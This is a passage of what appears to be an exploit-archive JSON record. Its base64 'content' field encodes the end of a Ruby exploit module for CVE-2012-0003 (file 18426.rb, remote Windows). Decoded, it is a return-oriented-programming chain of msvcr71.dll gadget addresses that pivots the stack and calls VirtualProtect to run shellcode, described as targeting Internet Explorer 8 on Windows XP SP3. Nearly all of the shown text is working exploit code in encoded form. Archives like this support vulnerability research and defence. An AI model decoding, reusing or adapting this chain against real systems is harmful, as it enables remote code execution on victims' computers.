Xh0KDQpLnVucGFjaygiTCIpWzBdLnRvX2kNCgkJbi50aW1lcyB7IHRtcCA8PCB2YWx1ZSB9DQoJCXJldHVybiB0bXANCgllbmQNCg0KCSMgUk9QIGNoYWluIGNvcGllZCBmcm9tIG1zMTFfMDUwX21zaHRtbF9jb2JqZWN0ZWxlbWVudC5yYiAoZ2VuZXJhdGVkIGJ5IG1vbmEpDQoJIyBBZGRlZCBhIGxpdHRsZSBvZiByb3BpbmcgdG8gYWRqdXN0IHRoZSBzdGFjayBwaXZvdGluZyBmb3IgdGhpcyBjYXNlDQoJIyBTcGVjaWZpYyBmb3IgSUU4IFhQIFNQMyBjYXNlIGF0IHRoaXMgdGltZQ0KCWRlZiBjcmVhdGVfcm9wX2NoYWluKG15X3RhcmdldCkNCg0KCQlyb3BfZ2FkZ2V0cyA9DQoJCVsNCgkJCTB4N2MzNDdmOTgsICAjIFJFVE4gKFJPUCBOT1ApIFttc3ZjcjcxLmRsbF0NCgkJCW15X3RhcmdldFsnU3RhY2tQaXZvdCddLCAgIyBzdGFja3Bpdm90DQoJCQlqdW5rLCAjIHBhZGRpbmcNCgkJCTB4N2MzNzY0MDIsICAjIFBPUCBFQlAgIyBSRVROIFttc3ZjcjcxLmRsbF0NCgkJCTB4N2MzNzY0MDIsICAjIHNraXAgNCBieXRlcyBbbXN2Y3I3MS5kbGxdDQoJCQkweDdjMzQ3Zjk3LCAgIyBQT1AgRUFYICMgUkVUTiBbbXN2Y3I3MS5kbGxdDQoJCQkweGZmZmZmODAwLCAgIyBWYWx1ZSB0byBuZWdhdGUsIHdpbGwgYmVjb21lIDB4MDAwMDAyMDEgKGR3U2l6ZSkNCgkJCTB4N2MzNTFlMDUsICAjIE5FRyBFQVggIyBSRVROIFttc3ZjcjcxLmRsbF0NCgkJCTB4N2MzNTQ5MDEsICAjIFBPUCBFQlggIyBSRVROIFttc3ZjcjcxLmRsbF0NCgkJCTB4ZmZmZmZmZmYsDQoJCQkweDdjMzQ1MjU1LCAgIyBJTkMgRUJYICMgRlBBVEFOICMgUkVUTiBbbXN2Y3I3MS5kbGxdDQoJCQkweDdjMzUyMTc0LCAgIyBBREQgRUJYLEVBWCAjIFhPUiBFQVgsRUFYICMgSU5DIEVBWCAjIFJFVE4gW21zdmNyNzEuZGxsXQ0KCQkJMHg3YzM0NGY4NywgICMgUE9QIEVEWCAjIFJFVE4gW21zdmNyNzEuZGxsXQ0KCQkJMHhmZmZmZmZjMCwgICMgVmFsdWUgdG8gbmVnYXRlLCB3aWxsIGJlY29tZSAweDAwMDAwMDQwDQoJCQkweDdjMzUxZWIxLCAgIyBORUcgRURYICMgUkVUTiBbbXN2Y3I3MS5kbGxdDQoJCQkweDdjMzRkMjAxLCAgIyBQT1AgRUNYICMgUkVUTiBbbXN2Y3I3MS5kbGxdDQoJCQkweDdjMzhiMDAxLCAgIyAmV3JpdGFibGUgbG9jYXRpb24gW21zdmNyNzEuZGxsXQ0KCQkJMHg3YzM0YjhkNywgICMgUE9QIEVESSAjIFJFVE4gW21zdmNyNzEuZGxsXQ0KCQkJMHg3YzM0N2Y5OCwgICMgUkVUTiAoUk9QIE5PUCkgW21zdmNyNzEuZGxsXQ0KCQkJMHg3YzM2NDgwMiwgICMgUE9QIEVTSSAjIFJFVE4gW21zdmNyNzEuZGxsXQ0KCQkJMHg3YzM0MTVhMiwgICMgSk1QIFtFQVhdIFttc3ZjcjcxLmRsbF0NCgkJCTB4N2MzNDdmOTcsICAjIFBPUCBFQVggIyBSRVROIFttc3ZjcjcxLmRsbF0NCgkJCTB4N2MzN2ExNTEsICAjIHB0ciB0byAmVmlydHVhbFByb3RlY3QoKSAtIDB4MEVGIFtJQVQgbXN2Y3I3MS5kbGxdDQoJCQkweDdjMzc4YzgxLCAgIyBQVVNIQUQgIyBBREQgQUwsMEVGICMgUkVUTiBbbXN2Y3I3MS5kbGxdDQoJCQkweDdjMzQ1YzMwLCAgIyBwdHIgdG8gJ3B1c2ggZXNwICMgIHJldCAnIFttc3ZjcjcxLmRsbF0NCgkJXS5mbGF0dGVuLnBhY2soJ1YqJykNCg0KCQlyZXR1cm4gcm9wX2dhZGdldHMNCgllbmQNCg0KDQplbmQ=", 
    "filename": "platforms/windows/remote/18426.rb", 
    "id": "18426", 
    "cves": [
        "CVE-2012-0003"
    ]
}